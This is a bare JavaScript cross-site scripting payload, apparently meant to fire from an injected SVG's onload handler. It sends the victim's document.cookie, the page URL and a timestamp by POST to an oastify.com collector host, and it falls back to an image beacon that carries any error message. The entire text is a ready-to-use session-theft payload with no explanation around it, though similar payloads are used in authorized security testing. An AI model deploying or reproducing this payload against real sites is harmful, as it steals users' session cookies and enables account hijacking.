svg.onload:
try {
  fetch('https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      url: window.location.href,
      timestamp: new Date().toISOString()
    }),
    headers: {'Content-Type': 'application/json'}
  });
} catch(e) {
  new Image().src = 'https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/error?msg=' + encodeURIComponent(e.message);
}
